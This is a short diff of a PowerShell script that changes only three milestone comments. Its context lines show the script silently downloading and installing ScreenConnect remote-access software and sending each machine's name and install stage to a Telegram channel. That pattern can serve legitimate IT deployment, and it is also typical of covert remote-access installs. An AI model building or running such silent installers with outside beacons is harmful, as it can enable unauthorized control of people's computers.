@@ -39,7 +39,7 @@ function Send-TelegramAlert {
     }
 }
 
-# === MILESTONE 1: SCRIPT LAUNCHED (RESTORED) ===
+# === MILESTONE 1: SCRIPT LAUNCHED ===
 Send-TelegramAlert -Message "[🚀] ScreenConnect Script Launched!`nPC: $Computer`nStatus: Starting system environmental pre-checks..."
 
 # 3. ANTI-1603 CONFLICT CLEANUP (Runs before installation)
@@ -59,7 +59,7 @@ try {
     Write-Output "Pre-cleanup encountered an issue but proceeding anyway: $_"
 }
 
-# === MILESTONE 2: DOWNLOAD INITIATED (RESTORED) ===
+# === MILESTONE 2: DOWNLOAD INITIATED ===
 Send-TelegramAlert -Message "[📥] Download Started`nPC: $Computer`nStatus: Fetching the ScreenConnect setup package..."
 
 # 4. Download Logic
@@ -80,7 +80,7 @@ catch {
     exit 1
 }
 
-# === MILESTONE 3: INSTALLATION STARTED (RESTORED) ===
+# === MILESTONE 3: INSTALLATION STARTED ===
 Send-TelegramAlert -Message "[🛠️] Installation Started`nPC: $Computer`nStatus: Handing the MSI binary package to the silent background execution engine..."
 
 # 5. Installation Logic
